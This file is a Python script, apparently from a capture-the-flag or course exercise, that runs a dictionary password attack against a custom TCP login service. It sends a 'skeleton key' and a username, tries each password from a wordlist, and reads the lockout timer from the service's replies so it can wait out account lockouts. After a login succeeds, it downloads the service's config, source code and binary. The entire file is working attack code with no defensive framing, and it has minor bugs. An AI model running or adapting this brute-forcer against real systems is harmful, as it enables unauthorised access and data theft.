import socket
import time
import sys
from findport import foundPort

# PORT = 10613

host = sys.argv[1]
skeletonkey = sys.argv[2]
username = sys.argv[3]
dictionary = sys.argv[4]


def passwordfinder(host, skeletonkey, username, dictionary):
    timer = 0
    with open(dictionary) as fp:
        for line in fp:
            line.rstrip('\n')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, foundPort))
            s.send(skeletonkey)
            data = s.recv(1024)
            print(data)

            s.send(username)
            pass_info = s.recv(1024)
            print(pass_info)

            if "account is locked" not in pass_info:
                s.send(line)
                correctpass = line
                dict_info = s.recv(1024)
                print(dict_info)
            elif "account is locked" in pass_info:
                dict_split = pass_info.split(' ')
                for words in dict_split:
                    if words.isdigit():
                        timer = words
                        timer = int(timer)
                        timer += 2
                        break
                s.close()
                while timer > 0:
                    sys.stdout.write('\rDuration : {}s'.format(timer))
                    timer -= 1
                    sys.stdout.flush()
                    time.sleep(1)

            if "Command" in dict_info:
                s.send("config")
                f = open("config", "w")
                f.write(s.recv(1024))
                s.close()

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, foundPort))
                s.send(skeletonkey)
                data = s.recv(1024)
                # print(data)
                s.send(username)
                passInfo = s.recv(1024)
                # print(passInfo)
                s.send(correctpass)
                dictInfo = s.recv(1024)
                # print(dictInfo)
                s.send("source")
                f = open("source", "w")
                f.write(s.recv(10000))
                s.close()

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, foundPort))
                s.send(skeletonkey)
                data = s.recv(1024)
                # print(data)
                s.send(username)
                passInfo = s.recv(1024)
                # print(passInfo)
                s.send(correctpass)
                dictInfo = s.recv(1024)
                s.send("binary")
                f = open("binary", "w+b")
                f.write(s.recv(50000, socket.MSG_WAITALL))
                s.close()
                break


passwordfinder(host, skeletonkey, username, dictionary)
